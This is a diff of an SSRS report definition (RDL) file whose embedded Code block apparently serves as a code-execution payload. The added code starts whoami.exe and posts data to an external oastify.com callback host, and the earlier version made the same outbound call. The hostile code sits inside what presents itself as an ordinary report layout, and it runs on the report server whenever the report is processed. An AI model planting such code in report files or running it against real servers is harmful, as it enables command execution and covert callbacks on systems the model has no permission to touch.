@@ -43,11 +43,11 @@
       <NumberOfRows>2</NumberOfRows>
     </GridLayoutDefinition>
   </ReportParametersLayout>
-  <Code>Try
-  Dim webClient As New System.Net.WebClient
-  Dim result As String = webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", "Hello")
-Catch
-End Try</Code>
+  <Code>
+    Dim p As System.Diagnostics.Process = System.Diagnostics.Process.Start("whoami.exe")
+    Dim webClient As New System.Net.WebClient
+    Dim result As String = webClient.UploadString("http://mka0xcp2xotw6hq3a0nt1owa117svpje.oastify.com/abc/123/", "Hello")
+  </Code>
   <rd:ReportUnitType>Inch</rd:ReportUnitType>
   <rd:PageUnit>Px</rd:PageUnit>
   <df:DefaultFontFamily>Segoe UI</df:DefaultFontFamily>
